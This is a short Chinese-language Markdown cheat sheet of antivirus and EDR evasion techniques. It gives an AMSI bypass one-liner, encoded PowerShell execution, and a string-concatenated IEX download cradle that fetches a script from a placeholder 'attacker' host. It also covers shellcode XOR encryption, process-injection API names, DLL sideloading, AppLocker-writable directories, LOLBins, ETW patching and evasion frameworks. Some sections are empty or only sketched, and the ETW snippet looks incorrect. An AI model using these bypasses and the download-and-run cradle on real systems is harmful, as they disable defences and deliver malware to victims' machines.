# 免杀技术补充

## 1. AMSI绕过

### PowerShell

```powershell
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

### 编码执行

```powershell
powershell -enc BASE64_COMMAND
```

### 字符串拼接

```powershell
$s = 'IEX'; $e = '(New-Object Net.WebClient).DownloadString("http://attacker/po.ps1")'; &($s+$e)
```

---

## 2. 加载器

### C#编译加载

```csharp
csc.exe /target:library /out:loader.dll loader.cs
```

### 反射加载

```csharp
Assembly.Load(byte[])
```

---

## 3. Shellcode加密

### XOR加密

```python
key = b"key"
shellcode = b"..."
encrypted = bytes(a ^ b for a,b in zip(shellcode, itertools.cycle(key)))
```

### AES加密

---

## 4. 进程注入

### 基础注入

```csharp
VirtualAlloc()
WriteProcessMemory()
CreateRemoteThread()
```

### PPID欺骗

```csharp
SetParent()
```

---

## 5. DLL侧加载

### 白+黑

```
使用白名单程序加载恶意DLL
```

---

## 6. AppLocker绕过

### 可用目录

```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\Troubleshooting
C:\Windows\Registration
%USERPROFILE%
```

---

## 7. 签名二进制利用

### Lolbins

```
rundll32.exe
regsvr32.exe
mshta.exe
certutil.exe
bitsadmin.exe
```

---

## 8. 防御规避

### ETW Patch

```csharp
NtSetInformationProcess(-1, ProcessTlsInformation, 0, 0)
```

### API Unhooking

手动映射DLL到内存

---

## 9. PowerShell混淆

### Invoke-Obfuscation

```
Invoke-Obfuscation
```

---

## 10. Veil框架

```bash
veil-evasion
```
